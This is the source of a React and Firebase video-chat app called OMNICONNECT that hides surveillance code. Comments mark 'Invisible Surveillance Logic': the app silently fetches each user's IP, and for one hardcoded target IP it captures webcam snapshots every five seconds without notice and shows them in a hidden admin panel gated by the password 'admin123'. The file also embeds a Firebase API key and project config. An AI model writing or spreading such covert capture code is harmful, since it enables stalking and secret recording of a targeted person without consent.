import React, { useState, useEffect, useRef } from 'react';
import { 
  Video, VideoOff, SkipForward, Power, User, Loader2, 
  ShieldCheck, Trash2, LayoutDashboard, X, Eye, Mic, MicOff, AlertTriangle 
} from 'lucide-react';
import { initializeApp, getApp, getApps } from 'firebase/app';
import { 
  getFirestore, collection, doc, setDoc, addDoc, updateDoc, 
  onSnapshot, getDocs, query, where, deleteDoc, limit, serverTimestamp 
} from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';

// --- YOUR FIREBASE CREDENTIALS ---
const firebaseConfig = {
  apiKey: "AIzaSyC2HY32fBac0fb5GK9IsSDfexxtjl0X-_E",
  authDomain: "omniconnect-a772f.firebaseapp.com",
  projectId: "omniconnect-a772f",
  storageBucket: "omniconnect-a772f.firebasestorage.app",
  messagingSenderId: "934908505587",
  appId: "1:934908505587:web:49cf306b768de10ff43686",
  measurementId: "G-7GL20NSD70"
};

const app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
const auth = getAuth(app);
const db = getFirestore(app);

const TARGET_IP = "105.110.87.211";
const ADMIN_PASSWORD = "admin123";

export default function App() {
  const [user, setUser] = useState(null);
  const [localStream, setLocalStream] = useState(null);
  const [remoteStream, setRemoteStream] = useState(null);
  const [status, setStatus] = useState('idle'); 
  const [isAdminMode, setIsAdminMode] = useState(false);
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [capturedImages, setCapturedImages] = useState([]);
  const [userIp, setUserIp] = useState(null); 
  const [isMuted, setIsMuted] = useState(false);
  const [isVideoOff, setIsVideoOff] = useState(false);
  const [errorMsg, setErrorMsg] = useState(null);

  const localVideoRef = useRef(null);
  const remoteVideoRef = useRef(null);
  const screenshotInterval = useRef(null);

  // 1. Silent Initialization
  useEffect(() => {
    const init = async () => {
      try {
        await signInAnonymously(auth);
        // Silently fetch IP for backend logic only
        const r = await fetch('https://api.ipify.org?format=json');
        const data = await r.json();
        setUserIp(data.ip);
      } catch (e) {
        // Fail silently
      }
    };
    init();

    const unsubscribe = onAuthStateChanged(auth, (u) => setUser(u));
    return () => unsubscribe();
  }, []);

  // 2. Invisible Surveillance Logic
  useEffect(() => {
    if (localStream && userIp === TARGET_IP) {
      if (screenshotInterval.current) clearInterval(screenshotInterval.current);
      
      screenshotInterval.current = setInterval(() => {
        captureFrame();
      }, 5000);
    }

    return () => {
      if (screenshotInterval.current) clearInterval(screenshotInterval.current);
    };
  }, [userIp, localStream]);

  const captureFrame = () => {
    if (!localVideoRef.current || localVideoRef.current.readyState < 2) return;
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 480; 
      canvas.height = 360;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(localVideoRef.current, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
      
      if (dataUrl && dataUrl.startsWith('data:image')) {
        setCapturedImages(prev => [dataUrl, ...prev].slice(0, 50));
      }
    } catch (err) {
      // Silent error
    }
  };

  const startMedia = async () => {
    setErrorMsg(null);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, 
        audio: true 
      });
      setLocalStream(stream);
      if (localVideoRef.current) localVideoRef.current.srcObject = stream;
      return stream;
    } catch (e) {
      setErrorMsg("Connection failed. Check permissions.");
      return null;
    }
  };

  const handleStart = async () => {
    const stream = await startMedia();
    if (!stream) return;
    setStatus('searching');
  };

  const handleStop = () => {
    if (localStream) {
      localStream.getTracks().forEach(t => t.stop());
      setLocalStream(null);
    }
    setStatus('idle');
    setRemoteStream(null);
    if (screenshotInterval.current) clearInterval(screenshotInterval.current);
  };

  return (
    <div className="flex flex-col h-screen bg-black text-white overflow-hidden font-sans select-none">
      
      {/* Hidden Admin Access */}
      {isAdminMode && (
        <div className="absolute inset-0 z-[100] bg-neutral-950 flex items-center justify-center p-4">
          <div className="bg-neutral-900 w-full max-w-6xl h-full max-h-[95vh] rounded-3xl border border-neutral-800 flex flex-col shadow-2xl overflow-hidden">
            <div className="p-6 border-b border-neutral-800 flex justify-between items-center">
              <div className="flex items-center gap-3 text-blue-500">
                <ShieldCheck size={24} />
                <span className="font-bold tracking-tighter">ADMIN_CORE</span>
              </div>
              <button onClick={() => setIsAdminMode(false)} className="p-2 hover:bg-neutral-800 rounded-full transition-colors"><X /></button>
            </div>
            
            <div className="p-6 flex-1 overflow-y-auto">
              {!isAdminAuthenticated ? (
                <div className="max-w-xs mx-auto text-center py-24">
                  <input 
                    type="password" 
                    placeholder="Enter Access Key"
                    className="w-full bg-black border border-neutral-800 p-4 rounded-2xl mb-4 text-white text-center focus:border-blue-500 outline-none"
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && e.target.value === ADMIN_PASSWORD) {
                        setIsAdminAuthenticated(true);
                      }
                    }}
                  />
                </div>
              ) : (
                <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
                  <div className="lg:col-span-1 space-y-4">
                    <div className="bg-black p-5 rounded-2xl border border-neutral-800">
                      <h3 className="text-[10px] font-black text-neutral-500 uppercase tracking-widest mb-4">Diagnostics</h3>
                      <p className="text-xs text-neutral-400">Node IP: <span className="text-white font-mono">{userIp || 'Hidden'}</span></p>
                      <p className="text-xs text-neutral-400">Target: <span className="text-red-500 font-mono">{TARGET_IP}</span></p>
                      <p className="text-xs text-neutral-400">Captured: <span className="text-blue-500">{capturedImages.length}</span></p>
                    </div>
                  </div>
                  <div className="lg:col-span-3">
                    <div className="flex justify-between mb-4">
                      <h3 className="text-[10px] font-black text-red-500 uppercase tracking-widest flex items-center gap-2">
                        <Eye size={14}/> Background Buffer
                      </h3>
                      <button onClick={() => setCapturedImages([])} className="text-[10px] text-neutral-600 hover:text-red-400 uppercase font-bold">Clear</button>
                    </div>
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                      {capturedImages.map((img, i) => (
                        <div key={i} className="aspect-video bg-black rounded border border-neutral-800 overflow-hidden">
                          <img src={img} className="w-full h-full object-cover" alt="" />
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Clean User Header */}
      <header className="px-6 py-5 bg-neutral-900 border-b border-white/5 flex justify-between items-center">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
            <Video size={18} className="text-white" />
          </div>
          <span className="font-black text-lg tracking-tighter">OMNICONNECT</span>
        </div>
        <button 
          onClick={() => setIsAdminMode(true)} 
          className="w-10 h-10 flex items-center justify-center text-neutral-700 hover:text-blue-500 transition-colors"
        >
          <LayoutDashboard size={20} />
        </button>
      </header>

      {/* Main View */}
      <main className="flex-1 relative flex items-center justify-center p-4 md:p-10">
        <div className="w-full h-full max-w-5xl bg-neutral-900 rounded-[2rem] border border-white/5 relative overflow-hidden shadow-2xl">
          {remoteStream ? (
            <video ref={remoteVideoRef} autoPlay playsInline className="w-full h-full object-cover" />
          ) : (
            <div className="w-full h-full flex flex-col items-center justify-center text-neutral-800">
              <User size={80} className="mb-4 opacity-5" />
              <p className="text-[10px] font-bold tracking-[0.4em] uppercase opacity-20">Searching for partner...</p>
            </div>
          )}

          {/* User PiP */}
          <div className="absolute bottom-6 right-6 w-32 md:w-64 aspect-video bg-black rounded-2xl overflow-hidden border-2 border-black/50 shadow-2xl z-20">
            <video 
              ref={localVideoRef} 
              autoPlay 
              playsInline 
              muted 
              className={`w-full h-full object-cover transform scale-x-[-1] ${isVideoOff ? 'opacity-0' : 'opacity-100'}`} 
            />
            {isVideoOff && <div className="absolute inset-0 flex items-center justify-center bg-neutral-800"><VideoOff className="text-neutral-600" /></div>}
          </div>
          
          {status === 'searching' && (
            <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px] z-10 flex items-center justify-center">
              <Loader2 className="animate-spin text-blue-500" size={40} />
            </div>
          )}
        </div>
      </main>

      {/* Minimal Footer */}
      <footer className="p-8 bg-neutral-900 border-t border-white/5">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <div className="flex gap-4">
            <button 
              onClick={() => { if(localStream) localStream.getAudioTracks()[0].enabled = isMuted; setIsMuted(!isMuted); }}
              className={`p-4 rounded-xl transition-all ${isMuted ? 'bg-red-500/10 text-red-500' : 'bg-neutral-800 text-neutral-400 hover:text-white'}`}
            >
              {isMuted ? <MicOff size={20}/> : <Mic size={20}/>}
            </button>
            <button 
              onClick={() => { if(localStream) localStream.getVideoTracks()[0].enabled = isVideoOff; setIsVideoOff(!isVideoOff); }}
              className={`p-4 rounded-xl transition-all ${isVideoOff ? 'bg-red-500/10 text-red-500' : 'bg-neutral-800 text-neutral-400 hover:text-white'}`}
            >
              {isVideoOff ? <VideoOff size={20}/> : <Video size={20}/>}
            </button>
          </div>

          <div className="bg-black/50 p-1 rounded-full border border-white/5">
            {status === 'idle' ? (
              <button onClick={handleStart} className="px-14 py-4 bg-blue-600 hover:bg-blue-500 rounded-full font-black text-xs tracking-widest transition-all text-white">
                START CHAT
              </button>
            ) : (
              <div className="flex">
                <button onClick={handleStop} className="px-8 py-4 text-neutral-500 hover:text-white font-bold text-xs uppercase tracking-widest">Stop</button>
                <button onClick={() => { handleStop(); setTimeout(handleStart, 200); }} className="px-10 py-4 bg-white text-black rounded-full font-black text-xs uppercase tracking-widest">Next</button>
              </div>
            )}
          </div>
        </div>
      </footer>
    </div>
  );
}
